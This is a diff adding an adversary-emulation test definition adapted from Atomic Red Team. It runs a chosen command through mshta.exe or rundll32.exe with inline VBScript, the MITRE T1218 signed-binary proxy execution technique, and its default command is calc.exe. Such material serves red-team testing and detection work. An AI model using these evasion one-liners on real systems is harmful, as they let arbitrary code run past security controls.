@@ -1,0 +1,54 @@
+# Adapted from Atomic Red Team - Signed Binary Proxy Execution
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1218
+# Original auto_generated_guids: 906865c3-e05f-4acc-85c4-fbc185455095, 638730e7-7aed-43dc-bf8c-8117f805f5bb
+
+---
+api_version: 2.0
+uuid: acdb09d0-189b-47cb-a9a8-5e4ee521c97e
+name: Execute VBScript with Signed Binary
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Execute VBScript commands using either mshta.exe or rundll32.exe.
+  FIN7 and other adversaries use these techniques for proxy execution.
+
+mitre:
+  tactics:
+    - TA0005 Defense Evasion
+  techniques:
+    - T1218 Signed Binary Proxy Execution
+  subtechniques:
+    - T1218.005 Mshta
+    - T1218.011 Rundll32
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: false
+
+args:
+  - name: method
+    description: The method to execute VBScript
+    type: string
+    choices:
+    - mshta
+    - rundll32
+    default: mshta
+  - name: command_to_execute
+    description: Command to execute
+    type: string
+    default: "calc.exe"
+
+steps:
+{{ if eq .Args.method "mshta" }}
+  - name: execute_mshta_vbscript
+    executor: cmd.exe
+    inline: |
+      mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -c {{.Args.command_to_execute}}"":close")
+{{ else if eq .Args.method "rundll32" }}
+  - name: execute_vbscript_command
+    executor: cmd.exe
+    inline: |
+      rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("{{.Args.command_to_execute}}"),0)
+{{ end }}
